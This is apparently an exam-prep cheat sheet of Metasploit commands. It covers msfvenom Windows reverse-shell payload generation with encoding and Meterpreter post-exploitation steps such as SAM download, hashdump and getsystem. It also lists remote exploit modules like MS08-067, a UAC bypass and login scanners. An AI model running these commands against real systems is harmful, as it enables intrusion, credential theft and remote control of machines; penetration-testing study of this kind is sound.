# Metasploit

### Searchsploit

```bash
#update
searchsploit -u

searchsploit --nmap [file.xml]
```

msfvenom -p \[payload\] -f \[format\] LHOST=\[your ip\] LPORT=\[your listener port\]

* windows/shell\_reverse\_tcp \(unstaged\)
* windows/shell/reverse\_tcp \(staged\)

Use Metasploit multi handler for staged \(allowed on exam\)

-e x86\shikata\_ga\_nai -b allows you to set bad characters --list payloads

msfvenom -a x86 --platform windows -p windows/shell\_reverse\_tcp -f python &gt; shellcode.txt

### Common Commands

```bash
upload file c:\\windows
download c:\\windows\\repair\\sam /tmp
execute -f c:\\windows\temp\exploit.exe
execute -f cmd -c
ps
shell
getsystem
hashdump
portfwd add –l 3389 –p 3389 –r target
portfwd delete –l 3389 –p 3389 –r target
```

### Common Modules

Remote Exploits

```bash
#MS08_067 Windows 2k, XP, 2003 Remote Exploit
use exploit/windows/smb/ms08_067_netapi

#MS08_040 Windows NT, 2k, XP, 2003 Remote Exploit
use exploit/windows/dcerpc/ms06_040_netapi

#MS09_050 Windows Vista SP1/SP2 and Server 2008 (x86) Remote Exploit
use exploit/windows/smb/ms09_050_smb2_negotiate_func_index
```

Local Exploits

```bash
#Bypass UAC on Windows 7 + Set target + arch, x86/64
use exploit/windows/local/bypassuac
```

Aux Modules

```bash
use auxiliary/scanner/http/dir_scanner
use auxiliary/scanner/http/jboss_vulnscan
use auxiliary/scanner/mssql/mssql_login
use auxiliary/scanner/mysql/mysql_version
use auxiliary/scanner/oracle/oracle_login
```

